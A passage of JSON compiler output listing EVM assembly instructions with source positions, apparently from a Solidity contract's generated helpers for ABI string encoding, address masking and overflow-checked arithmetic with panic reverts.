											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 477,
											"end": 478,
											"name": "DUP1",
											"source": 10
										},
										{
											"begin": 472,
											"end": 475,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 468,
											"end": 479,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 462,
											"end": 480,
											"name": "MLOAD",
											"source": 10
										},
										{
											"begin": 458,
											"end": 459,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 453,
											"end": 456,
											"name": "DUP5",
											"source": 10
										},
										{
											"begin": 449,
											"end": 460,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 442,
											"end": 481,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 414,
											"end": 416,
											"name": "PUSH",
											"source": 10,
											"value": "20"
										},
										{
											"begin": 411,
											"end": 412,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 407,
											"end": 417,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 402,
											"end": 417,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 402,
											"end": 417,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 378,
											"end": 491,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "201"
										},
										{
											"begin": 378,
											"end": 491,
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 378,
											"end": 491,
											"name": "tag",
											"source": 10,
											"value": "203"
										},
										{
											"begin": 378,
											"end": 491,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 525,
											"end": 526,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 516,
											"end": 522,
											"name": "DUP5",
											"source": 10
										},
										{
											"begin": 511,
											"end": 514,
											"name": "DUP5",
											"source": 10
										},
										{
											"begin": 507,
											"end": 523,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 500,
											"end": 527,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 349,
											"end": 533,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 287,
											"end": 533,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 287,
											"end": 533,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 287,
											"end": 533,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 287,
											"end": 533,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 539,
											"end": 641,
											"name": "tag",
											"source": 10,
											"value": "190"
										},
										{
											"begin": 539,
											"end": 641,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 580,
											"end": 586,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 631,
											"end": 633,
											"name": "PUSH",
											"source": 10,
											"value": "1F"
										},
										{
											"begin": 627,
											"end": 634,
											"name": "NOT",
											"source": 10
										},
										{
											"begin": 622,
											"end": 624,
											"name": "PUSH",
											"source": 10,
											"value": "1F"
										},
										{
											"begin": 615,
											"end": 620,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 611,
											"end": 625,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 607,
											"end": 635,
											"name": "AND",
											"source": 10
										},
										{
											"begin": 597,
											"end": 635,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 597,
											"end": 635,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 539,
											"end": 641,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 539,
											"end": 641,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 539,
											"end": 641,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 539,
											"end": 641,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 647,
											"end": 1024,
											"name": "tag",
											"source": 10,
											"value": "191"
										},
										{
											"begin": 647,
											"end": 1024,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 735,
											"end": 738,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 763,
											"end": 802,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "206"
										},
										{
											"begin": 796,
											"end": 801,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 763,
											"end": 802,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "187"
										},
										{
											"begin": 763,
											"end": 802,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 763,
											"end": 802,
											"name": "tag",
											"source": 10,
											"value": "206"
										},
										{
											"begin": 763,
											"end": 802,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 818,
											"end": 889,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "207"
										},
										{
											"begin": 882,
											"end": 888,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 877,
											"end": 880,
											"name": "DUP6",
											"source": 10
										},
										{
											"begin": 818,
											"end": 889,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "188"
										},
										{
											"begin": 818,
											"end": 889,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 818,
											"end": 889,
											"name": "tag",
											"source": 10,
											"value": "207"
										},
										{
											"begin": 818,
											"end": 889,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 811,
											"end": 889,
											"name": "SWAP4",
											"source": 10
										},
										{
											"begin": 811,
											"end": 889,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 898,
											"end": 963,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "208"
										},
										{
											"begin": 956,
											"end": 962,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 951,
											"end": 954,
											"name": "DUP6",
											"source": 10
										},
										{
											"begin": 944,
											"end": 948,
											"name": "PUSH",
											"source": 10,
											"value": "20"
										},
										{
											"begin": 937,
											"end": 942,
											"name": "DUP7",
											"source": 10
										},
										{
											"begin": 933,
											"end": 949,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 898,
											"end": 963,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "189"
										},
										{
											"begin": 898,
											"end": 963,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 898,
											"end": 963,
											"name": "tag",
											"source": 10,
											"value": "208"
										},
										{
											"begin": 898,
											"end": 963,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 988,
											"end": 1017,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "209"
										},
										{
											"begin": 1010,
											"end": 1016,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 988,
											"end": 1017,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "190"
										},
										{
											"begin": 988,
											"end": 1017,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 988,
											"end": 1017,
											"name": "tag",
											"source": 10,
											"value": "209"
										},
										{
											"begin": 988,
											"end": 1017,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 983,
											"end": 986,
											"name": "DUP5",
											"source": 10
										},
										{
											"begin": 979,
											"end": 1018,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 972,
											"end": 1018,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 972,
											"end": 1018,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 739,
											"end": 1024,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 647,
											"end": 1024,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 647,
											"end": 1024,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 647,
											"end": 1024,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 647,
											"end": 1024,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 647,
											"end": 1024,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 1030,
											"end": 1343,
											"name": "tag",
											"source": 10,
											"value": "14"
										},
										{
											"begin": 1030,
											"end": 1343,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1143,
											"end": 1147,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 1181,
											"end": 1183,
											"name": "PUSH",
											"source": 10,
											"value": "20"
										},
										{
											"begin": 1170,
											"end": 1179,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 1166,
											"end": 1184,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 1158,
											"end": 1184,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 1158,
											"end": 1184,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1230,
											"end": 1239,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 1224,
											"end": 1228,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 1220,
											"end": 1240,
											"name": "SUB",
											"source": 10
										},
										{
											"begin": 1216,
											"end": 1217,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 1205,
											"end": 1214,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 1201,
											"end": 1218,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 1194,
											"end": 1241,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 1258,
											"end": 1336,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "211"
										},
										{
											"begin": 1331,
											"end": 1335,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 1322,
											"end": 1328,
											"name": "DUP5",
											"source": 10
										},
										{
											"begin": 1258,
											"end": 1336,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "191"
										},
										{
											"begin": 1258,
											"end": 1336,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 1258,
											"end": 1336,
											"name": "tag",
											"source": 10,
											"value": "211"
										},
										{
											"begin": 1258,
											"end": 1336,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1250,
											"end": 1336,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 1250,
											"end": 1336,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1030,
											"end": 1343,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 1030,
											"end": 1343,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 1030,
											"end": 1343,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1030,
											"end": 1343,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1030,
											"end": 1343,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 1349,
											"end": 1475,
											"name": "tag",
											"source": 10,
											"value": "192"
										},
										{
											"begin": 1349,
											"end": 1475,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1386,
											"end": 1393,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 1426,
											"end": 1468,
											"name": "PUSH",
											"source": 10,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1419,
											"end": 1424,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 1415,
											"end": 1469,
											"name": "AND",
											"source": 10
										},
										{
											"begin": 1404,
											"end": 1469,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 1404,
											"end": 1469,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1349,
											"end": 1475,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 1349,
											"end": 1475,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 1349,
											"end": 1475,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1349,
											"end": 1475,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 1481,
											"end": 1661,
											"name": "tag",
											"source": 10,
											"value": "193"
										},
										{
											"begin": 1481,
											"end": 1661,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1529,
											"end": 1606,
											"name": "PUSH",
											"source": 10,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1526,
											"end": 1527,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 1519,
											"end": 1607,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 1626,
											"end": 1630,
											"name": "PUSH",
											"source": 10,
											"value": "11"
										},
										{
											"begin": 1623,
											"end": 1624,
											"name": "PUSH",
											"source": 10,
											"value": "4"
										},
										{
											"begin": 1616,
											"end": 1631,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 1650,
											"end": 1654,
											"name": "PUSH",
											"source": 10,
											"value": "24"
										},
										{
											"begin": 1647,
											"end": 1648,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 1640,
											"end": 1655,
											"name": "REVERT",
											"source": 10
										},
										{
											"begin": 1667,
											"end": 2077,
											"name": "tag",
											"source": 10,
											"value": "76"
										},
										{
											"begin": 1667,
											"end": 2077,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1707,
											"end": 1714,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 1730,
											"end": 1750,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "215"
										},
										{
											"begin": 1748,
											"end": 1749,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 1730,
											"end": 1750,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "192"
										},
										{
											"begin": 1730,
											"end": 1750,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 1730,
											"end": 1750,
											"name": "tag",
											"source": 10,
											"value": "215"
										},
										{
											"begin": 1730,
											"end": 1750,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1725,
											"end": 1750,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 1725,
											"end": 1750,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1764,
											"end": 1784,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "216"
										},
										{
											"begin": 1782,
											"end": 1783,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 1764,
											"end": 1784,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "192"
										},
										{
											"begin": 1764,
											"end": 1784,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 1764,
											"end": 1784,
											"name": "tag",
											"source": 10,
											"value": "216"
										},
										{
											"begin": 1764,
											"end": 1784,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1759,
											"end": 1784,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 1759,
											"end": 1784,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1819,
											"end": 1820,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 1816,
											"end": 1817,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 1812,
											"end": 1821,
											"name": "MUL",
											"source": 10
										},
										{
											"begin": 1841,
											"end": 1871,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "217"
										},
										{
											"begin": 1859,
											"end": 1870,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 1841,
											"end": 1871,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "192"
										},
										{
											"begin": 1841,
											"end": 1871,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 1841,
											"end": 1871,
											"name": "tag",
											"source": 10,
											"value": "217"
										},
										{
											"begin": 1841,
											"end": 1871,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1830,
											"end": 1871,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 1830,
											"end": 1871,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2020,
											"end": 2021,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2011,
											"end": 2018,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2007,
											"end": 2022,
											"name": "DIV",
											"source": 10
										},
										{
											"begin": 2004,
											"end": 2005,
											"name": "DUP5",
											"source": 10
										},
										{
											"begin": 2001,
											"end": 2023,
											"name": "EQ",
											"source": 10
										},
										{
											"begin": 1981,
											"end": 1982,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 1974,
											"end": 1983,
											"name": "ISZERO",
											"source": 10
										},
										{
											"begin": 1954,
											"end": 2037,
											"name": "OR",
											"source": 10
										},
										{
											"begin": 1931,
											"end": 2070,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "218"
										},
										{
											"begin": 1931,
											"end": 2070,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 2050,
											"end": 2068,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "219"
										},
										{
											"begin": 2050,
											"end": 2068,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "193"
										},
										{
											"begin": 2050,
											"end": 2068,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2050,
											"end": 2068,
											"name": "tag",
											"source": 10,
											"value": "219"
										},
										{
											"begin": 2050,
											"end": 2068,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1931,
											"end": 2070,
											"name": "tag",
											"source": 10,
											"value": "218"
										},
										{
											"begin": 1931,
											"end": 2070,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 1715,
											"end": 2077,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1667,
											"end": 2077,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 1667,
											"end": 2077,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 1667,
											"end": 2077,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1667,
											"end": 2077,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 1667,
											"end": 2077,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2083,
											"end": 2263,
											"name": "tag",
											"source": 10,
											"value": "79"
										},
										{
											"begin": 2083,
											"end": 2263,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2131,
											"end": 2208,
											"name": "PUSH",
											"source": 10,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2128,
											"end": 2129,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 2121,
											"end": 2209,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 2228,
											"end": 2232,
											"name": "PUSH",
											"source": 10,
											"value": "32"
										},
										{
											"begin": 2225,
											"end": 2226,
											"name": "PUSH",
											"source": 10,
											"value": "4"
										},
										{
											"begin": 2218,
											"end": 2233,
											"name": "MSTORE",
											"source": 10
										},
										{
											"begin": 2252,
											"end": 2256,
											"name": "PUSH",
											"source": 10,
											"value": "24"
										},
										{
											"begin": 2249,
											"end": 2250,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 2242,
											"end": 2257,
											"name": "REVERT",
											"source": 10
										},
										{
											"begin": 2269,
											"end": 2346,
											"name": "tag",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 2269,
											"end": 2346,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2306,
											"end": 2313,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 2335,
											"end": 2340,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 2324,
											"end": 2340,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 2324,
											"end": 2340,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2269,
											"end": 2346,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 2269,
											"end": 2346,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 2269,
											"end": 2346,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2269,
											"end": 2346,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2352,
											"end": 2543,
											"name": "tag",
											"source": 10,
											"value": "81"
										},
										{
											"begin": 2352,
											"end": 2543,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2392,
											"end": 2395,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 2411,
											"end": 2431,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "223"
										},
										{
											"begin": 2429,
											"end": 2430,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2411,
											"end": 2431,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 2411,
											"end": 2431,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2411,
											"end": 2431,
											"name": "tag",
											"source": 10,
											"value": "223"
										},
										{
											"begin": 2411,
											"end": 2431,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2406,
											"end": 2431,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 2406,
											"end": 2431,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2445,
											"end": 2465,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "224"
										},
										{
											"begin": 2463,
											"end": 2464,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 2445,
											"end": 2465,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "194"
										},
										{
											"begin": 2445,
											"end": 2465,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2445,
											"end": 2465,
											"name": "tag",
											"source": 10,
											"value": "224"
										},
										{
											"begin": 2445,
											"end": 2465,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2440,
											"end": 2465,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 2440,
											"end": 2465,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2488,
											"end": 2489,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2485,
											"end": 2486,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2481,
											"end": 2490,
											"name": "ADD",
											"source": 10
										},
										{
											"begin": 2474,
											"end": 2490,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 2474,
											"end": 2490,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2509,
											"end": 2512,
											"name": "DUP1",
											"source": 10
										},
										{
											"begin": 2506,
											"end": 2507,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2503,
											"end": 2513,
											"name": "GT",
											"source": 10
										},
										{
											"begin": 2500,
											"end": 2536,
											"name": "ISZERO",
											"source": 10
										},
										{
											"begin": 2500,
											"end": 2536,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "225"
										},
										{
											"begin": 2500,
											"end": 2536,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 2516,
											"end": 2534,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "226"
										},
										{
											"begin": 2516,
											"end": 2534,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "193"
										},
										{
											"begin": 2516,
											"end": 2534,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2516,
											"end": 2534,
											"name": "tag",
											"source": 10,
											"value": "226"
										},
										{
											"begin": 2516,
											"end": 2534,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2500,
											"end": 2536,
											"name": "tag",
											"source": 10,
											"value": "225"
										},
										{
											"begin": 2500,
											"end": 2536,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2352,
											"end": 2543,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 2352,
											"end": 2543,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 2352,
											"end": 2543,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2352,
											"end": 2543,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2352,
											"end": 2543,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2549,
											"end": 2784,
											"name": "tag",
											"source": 10,
											"value": "87"
										},
										{
											"begin": 2549,
											"end": 2784,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2589,
											"end": 2593,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 2609,
											"end": 2629,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "228"
										},
										{
											"begin": 2627,
											"end": 2628,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2609,
											"end": 2629,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "192"
										},
										{
											"begin": 2609,
											"end": 2629,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2609,
											"end": 2629,
											"name": "tag",
											"source": 10,
											"value": "228"
										},
										{
											"begin": 2609,
											"end": 2629,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2604,
											"end": 2629,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 2604,
											"end": 2629,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2643,
											"end": 2663,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "229"
										},
										{
											"begin": 2661,
											"end": 2662,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 2643,
											"end": 2663,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "192"
										},
										{
											"begin": 2643,
											"end": 2663,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2643,
											"end": 2663,
											"name": "tag",
											"source": 10,
											"value": "229"
										},
										{
											"begin": 2643,
											"end": 2663,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2638,
											"end": 2663,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 2638,
											"end": 2663,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2687,
											"end": 2688,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2684,
											"end": 2685,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2680,
											"end": 2689,
											"name": "SUB",
											"source": 10
										},
										{
											"begin": 2672,
											"end": 2689,
											"name": "SWAP1",
											"source": 10
										},
										{
											"begin": 2672,
											"end": 2689,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2711,
											"end": 2753,
											"name": "PUSH",
											"source": 10,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2705,
											"end": 2709,
											"name": "DUP2",
											"source": 10
										},
										{
											"begin": 2702,
											"end": 2754,
											"name": "GT",
											"source": 10
										},
										{
											"begin": 2699,
											"end": 2777,
											"name": "ISZERO",
											"source": 10
										},
										{
											"begin": 2699,
											"end": 2777,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "230"
										},
										{
											"begin": 2699,
											"end": 2777,
											"name": "JUMPI",
											"source": 10
										},
										{
											"begin": 2757,
											"end": 2775,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "231"
										},
										{
											"begin": 2757,
											"end": 2775,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "193"
										},
										{
											"begin": 2757,
											"end": 2775,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2757,
											"end": 2775,
											"name": "tag",
											"source": 10,
											"value": "231"
										},
										{
											"begin": 2757,
											"end": 2775,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2699,
											"end": 2777,
											"name": "tag",
											"source": 10,
											"value": "230"
										},
										{
											"begin": 2699,
											"end": 2777,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2549,
											"end": 2784,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 2549,
											"end": 2784,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 2549,
											"end": 2784,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2549,
											"end": 2784,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2549,
											"end": 2784,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2790,
											"end": 3022,
											"name": "tag",
											"source": 10,
											"value": "109"
										},
										{
											"begin": 2790,
											"end": 3022,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2830,
											"end": 2833,
											"name": "PUSH",
											"source": 10,
											"value": "0"
										},
										{
											"begin": 2849,
											"end": 2869,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "233"
										},
										{
											"begin": 2867,
											"end": 2868,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2849,
											"end": 2869,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "192"
										},
										{
											"begin": 2849,
											"end": 2869,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2849,
											"end": 2869,
											"name": "tag",
											"source": 10,
											"value": "233"
										},
										{
											"begin": 2849,
											"end": 2869,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2844,
											"end": 2869,
											"name": "SWAP2",
											"source": 10
										},
										{
											"begin": 2844,
											"end": 2869,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2883,
											"end": 2903,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "234"
										},
										{
											"begin": 2901,
											"end": 2902,
											"name": "DUP4",
											"source": 10
										},
										{
											"begin": 2883,
											"end": 2903,
											"name": "PUSH [tag]",
											"source": 10,
											"value": "192"
										},
										{
											"begin": 2883,
											"end": 2903,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 10
										},
										{
											"begin": 2883,
											"end": 2903,
											"name": "tag",
											"source": 10,
											"value": "234"
										},
										{
											"begin": 2883,
											"end": 2903,
											"name": "JUMPDEST",
											"source": 10
										},
										{
											"begin": 2878,
											"end": 2903,
											"name": "SWAP3",
											"source": 10
										},
										{
											"begin": 2878,
											"end": 2903,
											"name": "POP",
											"source": 10
										},
										{
											"begin": 2926,
											"end": 2927,
											"name": "DUP3",
											"source": 10
										},
										{
											"begin": 2923,
											"end": 2924,
											"name": "DUP3",
											"source": 10
										},
										{
